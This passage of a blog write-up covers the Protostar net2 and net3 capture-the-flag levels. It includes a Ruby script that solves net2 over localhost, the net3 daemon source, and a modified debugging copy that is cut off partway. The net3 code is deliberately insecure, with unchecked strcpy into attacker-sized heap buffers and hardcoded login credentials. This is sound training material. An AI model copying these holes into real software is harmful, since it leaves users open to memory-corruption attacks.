</span><span class='line'>  <span class="n">set_io</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/* Don&#39;t do this :&gt; */</span>
</span><span class='line'>  <span class="n">srandom</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">run</span><span class="p">();</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/tmp$ nc 0 2997 | hexdump -C
</span><span class='line'>00000000  85 9e e6 45 93 a9 db 61  6f 22 cd 4b 1d a0 cb 57  |...E...ao".K...W|</span></code></pre></td></tr></table></div></figure>


<p>We need to add up 4 unsigned 32-bit integers. Solution:</p>

<figure class='code'><figcaption><span>net2.rb </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1">#!/usr/bin/env ruby</span>
</span><span class='line'>
</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;socket&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="n">host</span> <span class="o">=</span> <span class="s2">&quot;127.0.0.1&quot;</span>
</span><span class='line'><span class="n">port</span> <span class="o">=</span> <span class="mi">2997</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="o">.</span><span class="n">new</span> <span class="n">host</span><span class="p">,</span> <span class="n">port</span>
</span><span class='line'><span class="n">n</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>
</span><span class='line'><span class="mi">4</span><span class="o">.</span><span class="n">times</span> <span class="k">do</span>
</span><span class='line'>        <span class="n">n</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;I&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">first</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'><span class="n">n</span> <span class="o">=</span> <span class="o">[</span><span class="n">n</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;V&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span> <span class="n">n</span><span class="p">,</span> <span class="mi">0</span>
</span><span class='line'>
</span><span class='line'><span class="nb">puts</span> <span class="n">s</span><span class="o">.</span><span class="n">gets</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/tmp$ ./net2.rb 
</span><span class='line'>you added them correctly</span></code></pre></td></tr></table></div></figure>


<h2>Protostar Net3</h2>

<figure class='code'><figcaption><span>net3.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &quot;../common/common.c&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define NAME &quot;net3&quot;</span>
</span><span class='line'><span class="cp">#define UID 996</span>
</span><span class='line'><span class="cp">#define GID 996</span>
</span><span class='line'><span class="cp">#define PORT 2996</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/*</span>
</span><span class='line'><span class="cm"> * Extract a null terminated string from the buffer </span>
</span><span class='line'><span class="cm"> */</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">get_string</span><span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="n">result</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> <span class="kt">u_int16_t</span> <span class="n">len</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">byte</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">byte</span> <span class="o">=</span> <span class="o">*</span><span class="n">buffer</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">byte</span> <span class="o">&gt;</span> <span class="n">len</span><span class="p">)</span> <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;badly formed packet&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="o">*</span><span class="n">result</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">byte</span><span class="p">);</span>
</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="o">*</span><span class="n">result</span><span class="p">,</span> <span class="n">buffer</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">byte</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/*</span>
</span><span class='line'><span class="cm"> * Check to see if we can log into the host</span>
</span><span class='line'><span class="cm"> */</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">login</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> <span class="kt">u_int16_t</span> <span class="n">len</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">resource</span><span class="p">,</span> <span class="o">*</span><span class="n">username</span><span class="p">,</span> <span class="o">*</span><span class="n">password</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">deduct</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">success</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">len</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;invalid login packet length&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">resource</span> <span class="o">=</span> <span class="n">username</span> <span class="o">=</span> <span class="n">password</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">deduct</span> <span class="o">=</span> <span class="n">get_string</span><span class="p">(</span><span class="o">&amp;</span><span class="n">resource</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
</span><span class='line'>  <span class="n">deduct</span> <span class="o">+=</span> <span class="n">get_string</span><span class="p">(</span><span class="o">&amp;</span><span class="n">username</span><span class="p">,</span> <span class="n">buffer</span><span class="o">+</span><span class="n">deduct</span><span class="p">,</span> <span class="n">len</span><span class="o">-</span><span class="n">deduct</span><span class="p">);</span>
</span><span class='line'>  <span class="n">deduct</span> <span class="o">+=</span> <span class="n">get_string</span><span class="p">(</span><span class="o">&amp;</span><span class="n">password</span><span class="p">,</span> <span class="n">buffer</span><span class="o">+</span><span class="n">deduct</span><span class="p">,</span> <span class="n">len</span><span class="o">-</span><span class="n">deduct</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">success</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="n">success</span> <span class="o">|=</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">resource</span><span class="p">,</span> <span class="s">&quot;net3&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">success</span> <span class="o">|=</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="s">&quot;awesomesauce&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">success</span> <span class="o">|=</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">password</span><span class="p">,</span> <span class="s">&quot;password&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">free</span><span class="p">(</span><span class="n">resource</span><span class="p">);</span>
</span><span class='line'>  <span class="n">free</span><span class="p">(</span><span class="n">username</span><span class="p">);</span>
</span><span class='line'>  <span class="n">free</span><span class="p">(</span><span class="n">password</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="o">!</span> <span class="n">success</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">send_string</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">byte</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">string</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="k">struct</span> <span class="n">iovec</span> <span class="n">v</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
</span><span class='line'>  <span class="kt">u_int16_t</span> <span class="n">len</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">expected</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">len</span> <span class="o">=</span> <span class="n">ntohs</span><span class="p">(</span><span class="mi">1</span> <span class="o">+</span> <span class="n">strlen</span><span class="p">(</span><span class="n">string</span><span class="p">));</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">;</span>
</span><span class='line'>  <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">len</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">byte</span><span class="p">;</span>
</span><span class='line'>  <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="n">string</span><span class="p">;</span>
</span><span class='line'>  <span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">string</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">expected</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">len</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">+</span> <span class="n">strlen</span><span class="p">(</span><span class="n">string</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">writev</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">v</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span> <span class="o">!=</span> <span class="n">expected</span><span class="p">)</span> <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;failed to write correct amount of bytes&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">run</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">u_int16_t</span> <span class="n">len</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">loggedin</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">nread</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">len</span><span class="p">));</span>
</span><span class='line'>      <span class="n">len</span> <span class="o">=</span> <span class="n">ntohs</span><span class="p">(</span><span class="n">len</span><span class="p">);</span>
</span><span class='line'>      <span class="n">buffer</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">len</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="o">!</span> <span class="n">buffer</span><span class="p">)</span> <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;malloc failure for %d bytes&quot;</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">nread</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">switch</span><span class="p">(</span><span class="n">buffer</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="p">{</span>
</span><span class='line'>          <span class="k">case</span> <span class="mi">23</span><span class="o">:</span>
</span><span class='line'>              <span class="n">loggedin</span> <span class="o">=</span> <span class="n">login</span><span class="p">(</span><span class="n">buffer</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">len</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
</span><span class='line'>              <span class="n">send_string</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">33</span><span class="p">,</span> <span class="n">loggedin</span> <span class="o">?</span> <span class="s">&quot;successful&quot;</span> <span class="o">:</span> <span class="s">&quot;failed&quot;</span><span class="p">);</span>
</span><span class='line'>              <span class="k">break</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>          <span class="k">default</span><span class="o">:</span>
</span><span class='line'>              <span class="n">send_string</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="s">&quot;what you talkin about willis?&quot;</span><span class="p">);</span>
</span><span class='line'>              <span class="k">break</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">username</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/* Run the process as a daemon */</span>
</span><span class='line'>  <span class="n">background_process</span><span class="p">(</span><span class="n">NAME</span><span class="p">,</span> <span class="n">UID</span><span class="p">,</span> <span class="n">GID</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/* Wait for socket activity and return */</span>
</span><span class='line'>  <span class="n">fd</span> <span class="o">=</span> <span class="n">serve_forever</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/* Set the client socket to STDIN, STDOUT, and STDERR */</span>
</span><span class='line'>  <span class="n">set_io</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/* Don&#39;t do this :&gt; */</span>
</span><span class='line'>  <span class="n">srandom</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">run</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>It is easy to solve the challenge when we understand the code. For
this purposes, we modified the source code to use a terminal for input or
output, instead of socket.</p>

<figure class='code'><figcaption><span>net3-modified.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/socket.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define NAME &quot;net3&quot;</span>
</span><span class='line'><span class="cp">#define UID 996</span>
</span><span class='line'><span class="cp">#define GID 996</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/*</span>
</span><span class='line'><span class="cm"> * Extract a null terminated string from the buffer</span>
</span><span class='line'><span class="cm"> */</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">get_string</span><span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="n">result</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> <span class="kt">u_int16_t</span> <span class="n">len</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">byte</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">byte</span> <span class="o">=</span> <span class="o">*</span><span class="n">buffer</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%d &lt; %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">byte</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">byte</span> <span class="o">&gt;</span> <span class="n">len</span><span class="p">)</span> <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;badly formed packet&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="o">*</span><span class="n">result</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">byte</span><span class="p">);</span>
</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="o">*</span><span class="n">result</span><span class="p">,</span> <span class="n">buffer</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">byte</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/*</span>
</span><span class='line'><span class="cm"> * Check to see if we can log into the host</span>
</span><span class='line'><span class="cm"> */</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">login</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> <span class="kt">u_int16_t</span> <span class="n">len</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">resource</span><span class="p">,</span> <span class="o">*</span><span class="n">username</span><span class="p">,</span> <span class="o">*</span><span class="n">password</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">deduct</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">success</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">len</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;invalid login packet length&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">resource</span> <span class="o">=</span> <span class="n">username</span> <span class="o">=</span> <span class="n">password</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">deduct</span> <span class="o">=</span> <span class="n">get_string</span><span class="p">(</span><span class="o">&amp;</span><span class="n">resource</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
</span><span class='line'>  <span class="n">deduct</span> <span class="o">+=</span> <span class="n">get_string</span><span class="p">(</span><span class="o">&amp;</span><span class="n">username</span><span class="p">,</span> <span class="n">buffer</span><span class="o">+</span><span class="n">deduct</span><span class="p">,</span> <span class="n">len</span><span class="o">-</span><span class="n">deduct</span><span class="p">);</span>
</span><span class='line'>  <span class="n">deduct</span> <span class="o">+=</span> <span class="n">get_string</span><span class="p">(</span><span class="o">&amp;</span><span class="n">password</span><span class="p">,</span> <span class="n">buffer</span><span class="o">+</span><span class="n">deduct</span><span class="p">,</span> <span class="n">len</span><span class="o">-</span><span class="n">deduct</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">success</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="n">success</span> <span class="o">|=</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">resource</span><span class="p">,</span> <span class="s">&quot;net3&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">success</span> <span class="o">|=</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="s">&quot;awesomesauce&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">success</span> <span class="o">|=</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">password</span><span class="p">,</span> <span class="s">&quot;password&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;success: %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">success</span><span class="p">);</span>
</span><span class='line'>
